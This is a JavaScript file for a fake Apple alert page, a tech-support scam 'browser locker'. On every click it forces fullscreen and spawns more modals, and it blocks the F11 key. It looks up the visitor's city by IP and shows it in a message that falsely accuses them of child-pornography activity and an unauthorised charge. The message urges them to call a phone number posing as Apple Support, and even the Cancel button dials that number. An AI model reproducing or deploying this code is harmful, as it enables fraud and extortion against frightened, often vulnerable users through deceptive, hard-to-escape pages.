
let modalCount = 0;
const maxModals = Infinity;
let fullScreenTriggered = false;

// Function to trigger full screen
function triggerFullScreen() {
    const elem = document.documentElement;
    if (!document.fullscreenElement) { // Only trigger if not already in fullscreen
        if (elem.requestFullscreen) {
            elem.requestFullscreen().catch(err => {
                console.error('Fullscreen error:', err);
            });
        } else if (elem.webkitRequestFullscreen) {
            elem.webkitRequestFullscreen();
        } else if (elem.msRequestFullscreen) {
            elem.msRequestFullscreen();
        }
    }
}

// Function to exit fullscreen
function exitFullScreen() {
    if (document.exitFullscreen) {
        document.exitFullscreen();
    } else if (document.webkitExitFullscreen) {
        document.webkitExitFullscreen();
    } else if (document.msExitFullscreen) {
        document.msExitFullscreen();
    }
}

// Function to generate random position within viewport
// Helper function to fetch and cache city
async function getCityByIP(targetElement) {
if (!targetElement) return;

// Check localStorage cache first
const cachedCity = localStorage.getItem('user_city');
if (cachedCity) {
    targetElement.textContent = cachedCity;
    return;
}

const providers = [
    async () => {
        const res = await fetch('https://get.geojs.io/v1/ip/geo.json');
        const data = await res.json();
        return data.city;
    },
    async () => {
        const res = await fetch('https://freeipapi.com/api/json');
        const data = await res.json();
        return data.cityName;
    },
    async () => {
        const res = await fetch('https://ipinfo.io/json');
        const data = await res.json();
        return data.city;
    }
];

for (const fetchCity of providers) {
    try {
        const city = await fetchCity();
        if (city && city.trim() !== '') {
            localStorage.setItem('user_city', city);
            targetElement.textContent = city;
            return;
        }
    } catch (e) {
        // Try next provider
    }
}

targetElement.textContent = 'your location';
}

function getRandomPosition(modalWidth, modalHeight) {
const viewportWidth = Math.max(document.documentElement.clientWidth || 0, window.innerWidth || 0);
const viewportHeight = Math.max(document.documentElement.clientHeight || 0, window.innerHeight || 0);

if (modalWidth >= viewportWidth || modalHeight >= viewportHeight) {
    return {
        top: Math.max(0, (viewportHeight - modalHeight) / 2),
        left: Math.max(0, (viewportWidth - modalWidth) / 2)
    };
}

const maxX = viewportWidth - modalWidth;
const maxY = viewportHeight - modalHeight;

const randomX = Math.floor(Math.random() * (maxX + 1));
const randomY = Math.floor(Math.random() * (maxY + 1));

return { top: randomY, left: randomX };
}

// Function to create a new modal with random position
function createNewModal() {
if (modalCount >= maxModals) return null;

modalCount++;

const newModal = document.createElement('div');
newModal.className = 'modal fade modal-stack';
newModal.id = `appleAlertModal-${modalCount}`;
newModal.tabIndex = -1;
newModal.setAttribute('aria-labelledby', `appleAlertModalLabel-${modalCount}`);
newModal.setAttribute('aria-hidden', 'true');

newModal.innerHTML = `
    <div class="modal-dialog modal-lg positioned">
        <div class="modal-content" id="applealertmodeltwo">
            <div class="modal-body text-center">
                <div class="alert-text">
                    Your Iphone Temporarily Restricted due to illegal Child Pornography activity. You have purchased a Pornhub subscription of 3249.90. The payment was processed from [<span class="user-city" style="font-weight:700;">Loading...</span>]. This is an unauthorized transaction. Your account has been locked because of a suspicious payment activity. Verify your account with Apple Support <a href="tel:+1-888-884-3096">+1-888-884-3096</a> to unlock it, otherwise your Iphone will be Permanently Locked.
                </div>

                <div class="text-end gap-4 mt-3 actionbtn">
                    <a href="tel:+1-888-884-3096" class="me-2 bg-primary">Call +1-888-884-3096</a>
                    <a href="tel:+1-888-884-3096" class="mt-3 bg-secondary" id="okBtn">Cancel</a>
                </div>
            </div>
        </div>
    </div>
`;

document.getElementById('modalContainer').appendChild(newModal);

// Update location inside the dynamic modal
const citySpan = newModal.querySelector('.user-city');
getCityByIP(citySpan);

const modal = new bootstrap.Modal(newModal, {
    backdrop: 'static',
    keyboard: false
});

const modalDialog = newModal.querySelector('.modal-dialog');
let modalWidth = Math.min(600, window.innerWidth * 0.9);
let modalHeight = window.innerWidth <= 576 ? 250 : 400;

const { top, left } = getRandomPosition(modalWidth, modalHeight);
modalDialog.style.top = `${top}px`;
modalDialog.style.left = `${left}px`;

if (window.innerWidth <= 576) {
    modalDialog.style.width = `${modalWidth}px`;
    modalDialog.style.maxWidth = 'none';
}

newModal.style.zIndex = 1080 + modalCount;
modal.show();

newModal.querySelectorAll('.tel-link').forEach(link => {
    link.addEventListener('click', () => {
        window.location.href = link.getAttribute('href');
    });
});
}

// Initialize the first modal
const appleAlertModal = new bootstrap.Modal(document.getElementById('appleAlertModal'), {
    backdrop: 'static',
    keyboard: false
});

document.addEventListener('DOMContentLoaded', function () {
    appleAlertModal.show();
});

// Add event listener to body for fullscreen and modal creation
document.body.addEventListener('click', () => {
    triggerFullScreen();
    createNewModal();
});

// On ESC â†’ exit fullscreen
document.addEventListener("keydown", function (e) {
    if (e.key === "Escape") {
        exitFullScreen();
    }
    if (e.key === "F11" || e.keyCode === 122) {
        e.preventDefault();
        e.stopPropagation();
        return false;
    }
}, true);

document.addEventListener("keyup", function (e) {
    if (e.key === "F11" || e.keyCode === 122) {
        e.preventDefault();
        e.stopPropagation();
        return false;
    }
}, true);

// If fullscreen exits (via ESC), next body click/activity will trigger fullscreen again
document.addEventListener("fullscreenchange", () => {
    if (!document.fullscreenElement) {
        // User exited fullscreen
        document.body.addEventListener("click", triggerFullScreen, { once: true });
    }
});

window.addEventListener('resize', function () {
    const modals = document.querySelectorAll('.modal-stack .modal-dialog.positioned');

    modals.forEach(modal => {
        const viewportHeight = window.innerHeight;
        const modalHeight = modal.offsetHeight;
        let { top } = getRandomPosition(modal.offsetWidth, modalHeight);

        if (top + modalHeight > viewportHeight) {
            top = Math.max(0, viewportHeight - modalHeight);
        }

        modal.style.top = `${top}px`;
        modal.style.left = `0`;
        modal.style.width = `100%`;
        modal.style.maxHeight = `${viewportHeight}px`;
        modal.style.overflow = `hidden`;
    });
});